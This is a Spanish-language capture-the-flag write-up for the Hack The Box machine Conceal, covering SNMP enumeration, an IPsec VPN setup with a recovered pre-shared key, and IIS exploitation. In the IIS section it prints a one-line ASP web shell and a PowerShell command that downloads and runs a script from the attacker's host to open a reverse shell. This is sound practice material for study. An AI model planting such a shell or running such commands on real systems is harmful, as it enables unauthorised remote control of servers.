# Conceal-HTB


## Nmap 

Esta maquina no permite que de una escanees lo puertos tcp por lo que tuve que usar UDP y ahi si.



Vemos el puerto 161 UDP de SNMP intentamos usar el snmpwalk

```
snmpwalk -v 2c -c public 10.10.10.116
```

Encontramos lo que parece ser un password

```
VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
```

![image](https://github.com/gecr07/Conceal-HTB/assets/63270579/ba97a2ff-cfd4-48de-bd6b-39c4d4592959)

## IKE - UDP 500

Nos tenemos que conectar via IPSEC.

> UDP 500 is used for Internet Key Exchange (IKE), which is used to establish an IPSEC VPN. There is some recon I can do on the IKE using ike-scan:

```
ike-scan -M 10.10.10.116
```

En base a lo que dice hacktricks podemos ver que tipo de conexion tiene. El problema de esto es la configuracion. 

```
sudo apt install strongswan
```

Para configurar tienes que tocar estos archivos y pues existen vaias maneras de hacer esto pero esta fue la que ami me funciono /etc/ipsec.conf:

```
# ipsec.conf - strongSwan IPsec configuration file

config setup
    charondebug="all"
    uniqueids=yes
    strictcrlpolicy=no

conn conceal
    authby=secret
    auto=add
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    type=transport
    keyexchange=ikev1
    left=10.10.14.15
    right=10.10.10.116
    rightsubnet=10.10.10.116[tcp]
```


Y ahora tocamos ipsec.secrets

```
# This file holds shared secrets or RSA private keys for authentication.

%any : PSK "Dudecake1!"
```

Despues te conectas con

```
 ipsec up conceal

Si no ajala intenta reinciar la conexion

 ipsec restart 
```

![image](https://github.com/gecr07/Conceal-HTB/assets/63270579/3c6e52e0-e1e5-4354-ba48-30e2e71a66f8)


Ya conectados tenemos acceso a todos los puertos.

![image](https://github.com/gecr07/Conceal-HTB/assets/63270579/27ea264d-9098-4370-9a26-7894b367ee33)


### IIS server 

![image](https://github.com/gecr07/Conceal-HTB/assets/63270579/10402f18-a2aa-4e7d-82ff-e436360e51ac)



Tenemos el folder upload ahi subimos el shell.asp

```
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

Y pues con la shell reverse...


```
http://10.129.228.122/upload/shell.asp?cmd=powershell%20iex(new-object%20net.webclient).downloadstring(%27http://10.10.15.72/shell.ps1%27)
```


## Podemos usar el Juicy potato


![image](https://github.com/gecr07/Conceal-HTB/assets/63270579/18c0b34b-d8e0-4549-b362-1fed2286ac35)



































